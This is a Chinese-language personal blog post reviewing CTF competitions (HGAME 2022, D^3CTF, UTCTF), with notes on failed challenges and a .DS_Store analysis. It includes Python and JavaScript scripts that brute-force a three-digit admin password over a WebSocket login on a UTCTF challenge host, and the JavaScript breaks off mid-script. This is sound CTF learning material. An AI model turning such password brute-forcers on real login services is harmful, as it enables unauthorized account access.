@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="ctf, solution, note, blog">
+    
+    <meta name="author" content="Forestsetyou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://forestsetyou.github.io/2022/03/25/security/ctf/ctf比赛复盘（一）/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF比赛复盘（一）">
+<meta property="og:url" content="http://forestsetyou.github.io/2022/03/25/Security/CTF/CTF%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="Festu&#39;s Blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180625659-1442162436.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180704160-269933016.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180721418-1643278113.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180739429-825543176.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180758874-305458105.png">
+<meta property="article:published_time" content="2022-03-25T10:09:00.000Z">
+<meta property="article:modified_time" content="2023-09-23T05:47:00.000Z">
+<meta property="article:author" content="Forestsetyou">
+<meta property="article:tag" content="ctf, solution, note, blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180625659-1442162436.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            CTF比赛复盘（一） -
+        
+        Festu&#39;s Blog
+    </title><meta name="robots" content="noindex">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Festu&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/hide_imgs/smiling_face.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Festu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/hide_imgs/post_thumbnail-2.jpg" alt="CTF比赛复盘（一）" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">CTF比赛复盘（一）</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/hide_imgs/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2022-03-25 18:09</span>
+        <span class="mobile">2022-03-25 18:09</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-09-23 13:47</span>
+            <span class="mobile">2023-09-23 13:47</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Security/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>#HGAME 2022</p>
+<p>##WEB</p>
+<p>###EASY RSA<br>下载后发现是一个python源码，简单浏览后（我不是看的很懂python和rsa）推测跑一跑出flag（偷懒qwq），执行后发现许多包未下载，用pip逐一安装，其中Crypto包安装存在一定问题，参考<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/wukai0909/article/details/109772278" >pip安装 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>后解决，扩展包安装完毕后发现仍无法运行:<code>cannot import name &#39;flag&#39; from &#39;secret&#39;</code>，寄！</p>
+<p>附大佬博客中的<a class="link"   target="_blank" rel="noopener" href="http://yugod.xmutsec.com/index.php/2018/03/31/28.html" >RSA题型总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>###蛛蛛…嘿嘿♥我的蛛蛛</p>
+<p>根据关卡序号N下方有N个按钮，其中有某一个可以通往下一关，F12打开源码，寻找有链接的按钮，100关后进入最后一关，寻找flag，网页源码中并没有flag，试图读取flag.txt失败，显示“KEY有毒”（所以是啥呀喂）！</p>
+<p>###Tetris plus</p>
+<p>小游戏，有三个同色的相互接触即可得分的消消乐，开心的玩到3000分提示莫得flag（寄）。</p>
+<h1 id="D-3CTF"><a href="#D-3CTF" class="headerlink" title="D^3CTF"></a>D^3CTF</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="d3oj"><a href="#d3oj" class="headerlink" title="d3oj"></a>d3oj</h3><ul>
+<li>一言:<a class="link"   target="_blank" rel="noopener" href="https://hitokoto.cn/" >https://hitokoto.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h3 id="shorter"><a href="#shorter" class="headerlink" title="shorter"></a>shorter</h3><ul>
+<li><p>.DS_Store:<a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/34705467" >.DS_Store文件解析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>本题</strong></p>
+<p>0x04块对齐</p>
+<p>偏移量表:[</p>
+<p>00 00 10 0B, &#x2F;&#x2F;根块信息,标记为0x01号</p>
+<p>00 00 00 45,</p>
+<p>00 00 00 25,</p>
+<p>]</p>
+<p>计算位置及大小:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x01:</span><br><span class="line">100BH =&gt; 0000 1011B =&gt; 0x1000 //位置,别忘了0x04的偏移</span><br><span class="line">01011B = 11D =&gt; 2^11 = 2048 =&gt; 1000 0000 0000B =&gt; 0x0800 //大小</span><br><span class="line">0x02:</span><br><span class="line">0045H =&gt; 0100 0101B =&gt; 0x40 </span><br><span class="line">2^5 = 32 = 0x20</span><br><span class="line">0x03:</span><br><span class="line">0x25 =&gt; 0010 0101B =&gt; 0x20</span><br><span class="line">2^5 = 32 = 0x20</span><br></pre></td></tr></table></figure></div>
+
+<p>得出结论:没有目录信息….(我吐了)</p>
+</li>
+<li><p>_MACOSX:<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/colin_zhang/article/details/6542791" >_MACOSX是什么文件夹 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</li>
+<li><p>SNAPSHOT:<a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/maven/maven-snapshots.html" >Maven快照 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</li>
+<li><p>Docker:<a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/docker/docker-tutorial.html" >Docker菜鸟 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</li>
+</ul>
+<h1 id="UTCTF"><a href="#UTCTF" class="headerlink" title="UTCTF"></a>UTCTF</h1><p><a class="link"   target="_blank" rel="noopener" href="https://utctf.live/challenges" >UTCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h2><ul>
+<li>IP端口范围[1,65535]</li>
+</ul>
+<h3 id="Websockets"><a href="#Websockets" class="headerlink" title="Websockets?"></a>Websockets?</h3><p>进入登陆页面，采用”websocket”协议进行用户登录的连接，用burp抓包后发现要想建立连接需要快速发送:</p>
+<ol>
+<li>“begin”</li>
+<li>“user ${user}”</li>
+<li>“pass ${password}”</li>
+</ol>
+<p>当user与pass的值都正确后才能成功建立连接。F12发现源码中有提示密码位三位数字，编写脚本进行爆破即可。</p>
+<p>nkk提供了python的爆破脚本</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向服务器端认证，用户名密码通过才能退出循环</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">auth_system</span>(<span class="params">websocket, password</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        begin_text = <span class="string">&quot;begin&quot;</span></span><br><span class="line">        username = <span class="string">&quot;user admin&quot;</span></span><br><span class="line">        password = <span class="string">&quot;pass &quot;</span>+ password</span><br><span class="line">        <span class="keyword">await</span> websocket.send(begin_text)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(username)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(password)</span><br><span class="line">        response_str = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="built_in">print</span>(password +<span class="string">&quot; &quot;</span> + response_str)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;badpass&quot;</span> <span class="keyword">in</span> response_str:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main_logic</span>():</span><br><span class="line">    Continue = <span class="literal">True</span></span><br><span class="line">    password = <span class="number">100</span></span><br><span class="line">    <span class="keyword">while</span> Continue:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(<span class="string">&#x27;ws://web1.utctf.live:8651/internal/ws&#x27;</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">            Continue = <span class="keyword">await</span> auth_system(websocket, <span class="built_in">str</span>(password))</span><br><span class="line"></span><br><span class="line">        password += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># await send_msg(websocket)</span></span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(main_logic())</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>尝试自己编写js的爆破脚本(0&#x2F;1)</strong></p>
+<p><em>3&#x2F;14 2:28 脚本编写已成功(1&#x2F;1)</em></p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">send_</span>(<span class="params">wss,msg</span>)&#123;  <span class="comment">//发送信息</span></span><br><span class="line">    wss.<span class="title function_">send</span>(msg);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sending: &#x27;</span>+msg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">websoc</span>(<span class="params">num</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;ws://web1.utctf.live:8651/internal/ws&#x27;</span>);  <span class="comment">//创建ws连接</span></span><br><span class="line">    <span class="keyword">var</span> isOk=<span class="literal">false</span>;  <span class="comment">//标记此次连接的试探结果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">        ws.<span class="property">onopen</span> = <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;  </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;well open&quot;</span>);  <span class="comment">//通知连接成功</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">await</span> <span class="title function_">send_</span>(ws,<span class="string">&#x27;begin&#x27;</span>);  <span class="comment">//按格式发送数据来创建session</span></span><br><span class="line">                <span class="keyword">await</span> <span class="title function_">send_</span>(ws,<span class="string">&quot;user admin&quot;</span>);</span><br><span class="line">                <span class="keyword">await</span> <span class="title function_">send_</span>(ws,<span class="string">&quot;pass &quot;</span>+num);  <span class="comment">//密码试探</span></span><br><span class="line">                <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">                        <span class="built_in">setTimeout</span>(resolve,<span class="number">10000</span>)  <span class="comment">//若十秒内无badpass回显则此次试探成功</span></span><br><span class="line">                        ws.<span class="property">onmessage</span> = <span class="function">(<span class="params">evt</span>) =&gt;</span> &#123;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(evt);</span><br><span class="line">                            <span class="keyword">if</span>(evt.<span class="property">data</span>==<span class="string">&#x27;badpass&#x27;</span>) &#123;  <span class="comment">//此次试探失败，更改标记</span></span><br><span class="line">                                isOk=<span class="literal">true</span>;  <span class="comment">//这里顺序可以调换，resolve()不会立即跳出</span></span><br><span class="line">                                <span class="title function_">resolve</span>(<span class="string">&#x27;pwderr&#x27;</span>);  </span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span 